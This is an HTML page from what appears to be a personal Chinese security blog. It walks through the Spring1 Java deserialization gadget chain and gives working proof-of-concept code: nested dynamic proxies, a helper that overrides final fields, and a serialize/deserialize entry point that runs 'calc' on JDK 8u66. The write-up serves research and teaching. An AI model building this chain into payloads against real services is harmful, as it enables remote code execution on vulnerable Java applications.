@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            Spring反序列化链1
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你想成为java master吗？</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://ch1e.cn/post/spring-xi-lie-fan-xu-lie-hua-lian/">https://ch1e.cn/post/spring-xi-lie-fan-xu-lie-hua-lian/</a></p>
+<p>花费近5小时，从头到尾80%独立分析，只从参考文章瞄了一眼<code>MethodInvokeTypeProvider</code>，<code>ObjectFactoryDelegatingInvocationHandler</code>，<code>AnnotationInvocationHandler</code>这三个类，其余部分全靠自己打通，最终弹出calc。</p>
+<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><p>之前对动态代理只有初步认识，独立分析完spring1一切都清晰了。</p>
+<p>关于动态代理的原理与demo网上有。</p>
+<p>动态代理最重要的两个部分：实现的接口与handler。</p>
+<p>使用<code>Proxy.newProxyInstance</code>创建代理时，接口列表写了什么，代理对象就实现了什么接口。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-unser1/image-20240223120602331.png" alt="image-20240223120602331.png"></p>
+<p>而handler对象用来hook该对象的所有方法，hook的具体操作在handler的invoke方法里实现。有一些方法不会被hook：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-unser1/image-20240223121035124.png" alt="image-20240223121035124.png"></p>
+<p>所以总结一下动态代理大概原理：动态创建一个<strong>类</strong>（com.sun.proxy.$Proxy0 1 2…），这个<strong>类</strong>实现了<strong>任意接口</strong>，然后new 该类产生的对象即代理对象。代理对象有invocationHandler对象，调用代理对象的方法都会经过invocationHandler对象的invoke方法。</p>
+<p>所以动态代理发挥作用最关键的就是InvocationHandler。</p>
+<h1 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h1><p>这个类的invoke方法：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-unser1/image-20240223125056692.png" alt="image-20240223125056692.png"></p>
+<p>该handler的作用：当调用动态代理的方法时，将方法名作为key，从memberValues取出value作为该方法的返回值。注意返回值类型要相同。这个handler参与反序列化时，memberValues是任意可控的，key和value也任意可控。</p>
+<p>所以总结这个handler的作用：<strong>令某个方法返回任意对象</strong>。这个对象也可以是动态代理对象，只需要实现返回值的接口即可。</p>
+<h1 id="ObjectFactoryDelegatingInvocationHandler"><a href="#ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="ObjectFactoryDelegatingInvocationHandler"></a>ObjectFactoryDelegatingInvocationHandler</h1><p><code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-unser1/image-20240223125614398.png" alt="image-20240223125614398.png"></p>
+<p><code>this.objectFactory.getObject()</code>没细看底层实现， 不知是否可控。</p>
+<p>但是若使用上面说的AnnotationInvocationHandler，能达到的效果是<strong>令某个方法返回任意对象</strong>，所以<code>this.objectFactory.getObject()</code>也是任意可控的。</p>
+<p>所以总结ObjectFactoryDelegatingInvocationHandler的作用：<strong>将调用某个对象的method，变为调用任意可控对象的method</strong>。注意类型和参数要匹配。</p>
+<h1 id="MethodInvokeTypeProvider"><a href="#MethodInvokeTypeProvider" class="headerlink" title="MethodInvokeTypeProvider"></a>MethodInvokeTypeProvider</h1><p><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code></p>
+<p>spring1的入口就是这里。</p>
+<p>这个类的readObject：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-unser1/image-20240223125501012.png" alt="image-20240223125501012.png"></p>
+<h1 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>jdk版本8u66，8u73或者更高打不通。</p>
+<p>入口在<code>MethodInvokeTypeProvider#readObject</code>。</p>
+<h2 id="findMethod"><a href="#findMethod" class="headerlink" title="findMethod"></a>findMethod</h2><p>先看findMethod。</p>
+<p>首先要知道sink点，是<code>TemplatesImpl#getOutputProperties</code>或者<code>TemplatesImpl#newTransformer</code>。</p>
+<p>那么容易想到尝试的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ReflectionUtils.findMethod(Templates.class, &quot;getOutputProperties&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是getType要求返回值类型是<code>java.lang.reflect.Type</code>。所以现在的问题是如何让<code>this.provider.getType()</code>既是Templates又是Type？</p>
+<p>解决方法是令<code>this.provider.getType()</code>返回一个动态代理，我们手动让这个代理实现Templates和Type两个接口。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; typeInterface = Class.forName(&quot;java.lang.reflect.Type&quot;);</span><br><span class="line">Object proxy = Proxy.newProxyInstance(typeInterface.getClassLoader(),new Class[]&#123;typeInterface,Templates.class&#125;, handler);</span><br></pre></td></tr></table></figure>
+
+<p>那么如何令<code>this.provider.getType()</code>返回一个动态代理？前面说过，AnnotationInvocationHandler的作用是<strong>令某个方法返回任意对象</strong>。</p>
+<p>那么只需要令<code>this.provider</code>为一个代理，这个代理的handler是<code>AnnotationInvocationHandler</code>，并设置好memberValues，此时<code>this.provider.getType</code>返回的就是任意对象。</p>
+<p>此时，findMethod已经能获取到method为<code>Templates#getOutputProperties</code>。</p>
+<p>现在要令调用该method的对象是TemplatesImpl，怎么办？</p>
+<p>此时代理的handler还没确定。</p>
+<h2 id="invokeMethod"><a href="#invokeMethod" class="headerlink" title="invokeMethod"></a>invokeMethod</h2><p><code>ReflectionUtils.invokeMethod(method, this.provider.getType());</code></p>
+<p>这条语句，会<strong>调用动态代理的Templates#getOutputProperties方法</strong>。</p>
+<p>前面说过，<code>ObjectFactoryDelegatingInvocationHandler</code>这个handler的核心作用是<strong>将调用某个对象的method，变为调用任意可控对象的method</strong>。</p>
+<p>那么我们可以将<strong>调用动态代理的Templates#getOutputProperties方法</strong>这一操作，变为<strong>调用TemplatesImpl的Templates#getOutputProperties</strong>这一操作。</p>
+<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p>第一个代理，用于调用getType时返回第二个代理。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static Object proxy1() throws Exception&#123;</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Class&lt;?&gt; methodInvokeTypeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);</span><br><span class="line">    </span><br><span class="line">    Object proxy2 = proxy2();</span><br><span class="line">    </span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = new HashMap();</span><br><span class="line">    hashMap.put(&quot;getType&quot;,proxy2);</span><br><span class="line">    Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructors()[0];</span><br><span class="line">    constructor.setAccessible(true);</span><br><span class="line">    Object handler = constructor.newInstance(Target.class, hashMap);</span><br><span class="line">    Object proxy = Proxy.newProxyInstance(methodInvokeTypeProviderClass.getClassLoader(), methodInvokeTypeProviderClass.getInterfaces(),(InvocationHandler) handler);</span><br><span class="line">    return proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二个代理，设置给objectFactory。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static Object proxy2() throws Exception&#123;</span><br><span class="line">    Class&lt;?&gt; handlerClass = Class.forName(&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;);</span><br><span class="line">    Object handler = Util.createWithoutConstructor(handlerClass);</span><br><span class="line">    </span><br><span class="line">    setFinalFieldValue(handler,&quot;objectFactory&quot;,proxy3());</span><br><span class="line">    </span><br><span class="line">    Class&lt;?&gt; typeInterface = Class.forName(&quot;java.lang.reflect.Type&quot;);</span><br><span class="line">    Object proxy = Proxy.newProxyInstance(typeInterface.getClassLoader(),new Class[]&#123;typeInterface,Templates.class&#125;,(InvocationHandler) handler);</span><br><span class="line">    return proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第三个代理，用于调用objectFactory的getObject时返回TemplatesImpl</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static Object proxy3() throws Exception&#123;</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Class&lt;?&gt; factoryClass = Class.forName(&quot;org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory&quot;);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = new HashMap();</span><br><span class="line">    hashMap.put(&quot;getObject&quot;,getTemplateImpl(&quot;calc&quot;));</span><br><span class="line">    Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructors()[0];</span><br><span class="line">    constructor.setAccessible(true);</span><br><span class="line">    Object handler = constructor.newInstance(Target.class, hashMap);</span><br><span class="line"></span><br><span class="line">    Object proxy = Proxy.newProxyInstance(factoryClass.getClassLoader(),factoryClass.getInterfaces(),(InvocationHandler) handler);</span><br><span class="line">    return proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化入口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; methodInvokeTypeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);</span><br><span class="line">    Object invokeTypeProvider = Util.createWithoutConstructor(methodInvokeTypeProviderClass);</span><br><span class="line">    Object proxy1 = proxy1();</span><br><span class="line">    setFinalFieldValue(invokeTypeProvider,&quot;provider&quot;,proxy1);</span><br><span class="line">    setFinalFieldValue(invokeTypeProvider,&quot;methodName&quot;,&quot;getOutputProperties&quot;);</span><br><span class="line">    Util.unserialize(Util.serialize(invokeTypeProvider));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改final属性</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void setFinalFieldValue(Object obj,String name,Object val) throws Exception&#123;</span><br><span class="line">    Field nameField = obj.getClass().getDeclaredField(name);</span><br><span class="line">    Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;); //①</span><br><span class="line">    modifiersField.setAccessible(true);</span><br><span class="line">    modifiersField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL); //②</span><br><span class="line">    nameField.setAccessible(true);</span><br><span class="line">    nameField.set(obj,val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="JDK版本"><a href="#JDK版本" class="headerlink" title="JDK版本"></a>JDK版本</h1><p>在8u66中，创建出AnnotationInvocationHandler对象并修改memberValues，经过序列化和反序列化，memberValues不变。</p>
+<p>在8u73中，创建出AnnotationInvocationHandler对象并修改memberValues，经过序列化和反序列化，memberValues改变。</p>
+<p>不同之处就在AnnotationInvocationHandler#readObject。</p>
+<p>在高版本JDK中，readObject时会检查type属性，type属性是一个注解。注解有一个属性叫做memberTypes，是个map。</p>
+<p>假如memberValues序列化前有如下键值对：A1-&gt;B1，A2-&gt;B2</p>
+<p>memberTypes的键值对：A1-&gt;C1</p>
+<p>那么经过readObject，最终的memberValues的键值对：A1-&gt;B1或C1，A2-&gt;null。</p>
+<p>memberTypes是什么？</p>
+<p>如Target这个注解，他的memberTypes的key是value，值不知道是什么。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/spring-unser1/image-20240223140813648.png" alt="image-20240223140813648.png"></p>
+<p>所以在高版本JDK中，memberValues不是任意可控了，必须找到某个注解，这个注解的memberTypes的key里有getType和getObject。</p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-text">动态代理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AnnotationInvocationHandler"><span class="toc-text">AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ObjectFactoryDelegatingInvocationHandler"><span class="toc-text">ObjectFactoryDelegatingInvocationHandler</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MethodInvokeTypeProvider"><span class="toc-text">MethodInvokeTypeProvider</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90"><span class="toc-text">开始分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#findMethod"><span class="toc-text">findMethod</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#invokeMethod"><span class="toc-text">invokeMethod</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">代码实现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JDK%E7%89%88%E6%9C%AC"><span class="toc-text">JDK版本</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
